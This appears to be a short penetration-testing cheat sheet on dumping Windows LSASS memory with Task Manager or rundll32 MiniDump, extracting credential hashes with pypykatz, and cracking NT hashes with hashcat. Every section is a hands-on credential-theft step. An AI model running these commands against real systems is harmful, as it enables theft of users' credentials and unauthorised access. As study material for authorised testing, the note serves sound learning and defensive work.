-- -
I believe you still need to have local admin access to dump this.
### Generate Dump File
-- -
#### GUI
If you have RDP/graphical access to a Windows system, you can use the task manager to create an LSASS dump file:

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

Find the dump file at: `C:\Users\loggedonusersdirectory\AppData\Local\Temp\lsass.DMP`

##### cmd
```powershell
# look for lsass.exe and note its PID
tasklist /svc
```
##### PowerShell
```powershell
# note its PID
Get-Process lsass

# generate lsass.dmp dump file
rundll32 C:\windows\system32\comsvc.dll, MiniDump <lsass PID> C:\lsass.dmp full
```

Then just [[Dark Arts I/File Transfer/~Home| File transfer]] dump file over to your attack box
### Dump Hashes from dump file
-- -
pypykatz is mimikatz but written in python so you can use it on whatever platform you want. 
```bash
pypykatz lsa minidump <path to dump file> 
```
### Crack NT hashes
-- -
Use hashcat to crack the NT hashes output by pypykatz
```bash
sudo hashcat -m 1000 <hash> <wordlist> 
```